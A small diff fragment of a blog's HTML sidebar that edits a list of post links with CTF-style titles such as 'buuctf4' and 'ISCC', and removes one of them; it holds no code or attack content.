+          </li>
         
           <li>
             <a href="/2021/05/23/buuctf4/">buuctf4</a>
@@ -738,10 +778,6 @@
         
           <li>
             <a href="/2021/05/13/web%E5%81%9A%E9%A2%98%E6%80%9D%E8%B7%AF/">做题思路</a>
-          </li>
-        
-          <li>
-            <a href="/2021/05/04/2021ISCC/">ISCC</a>
           </li>
         
       </ul>
